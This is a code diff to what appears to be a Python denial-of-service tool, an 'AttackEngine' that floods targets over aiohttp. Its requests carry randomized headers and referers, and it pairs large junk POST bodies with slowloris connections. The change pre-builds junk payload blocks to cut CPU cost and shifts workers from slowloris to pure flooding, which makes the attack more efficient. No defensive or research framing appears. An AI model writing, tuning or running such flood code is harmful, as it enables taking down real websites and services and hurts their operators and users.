@@ -36,8 +36,12 @@ def _h():
             "Accept-Encoding": "gzip, deflate, br", "Referer": random.choice(REF) + _j(5, 15),
             "Cache-Control": "no-cache", "Connection": "keep-alive"}
 
+# Pre-generated junk blocks for fat payloads (avoid per-request CPU burn)
+_JUNK_BLOCKS = ["".join(random.choices(_c, k=10000)) for _ in range(20)]
+
 def _p():
-    return {_j(5, 10): _j(5000, 15000) for _ in range(random.randint(3, 8))}
+    return {_j(5, 10): random.choice(_JUNK_BLOCKS)[:random.randint(5000, 10000)]
+            for _ in range(random.randint(2, 5))}
 
 def _m(m):
     return random.choice(["GET", "POST", "HEAD"]) if m == AttackMethod.MIX else m.value
@@ -123,9 +127,9 @@ class AttackEngine:
         d_conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False, enable_cleanup_closed=True)
         d_session = aiohttp.ClientSession(connector=d_conn, timeout=d_timeout)
 
-        # 80% flood workers, 20% slowloris connections
-        flood_count = int(num_workers * 0.8)
-        slow_count = num_workers - flood_count
+        # Cap slowloris at 200 — rest is pure flood
+        slow_count = min(200, num_workers // 5)
+        flood_count = num_workers - slow_count
 
         workers = []
 
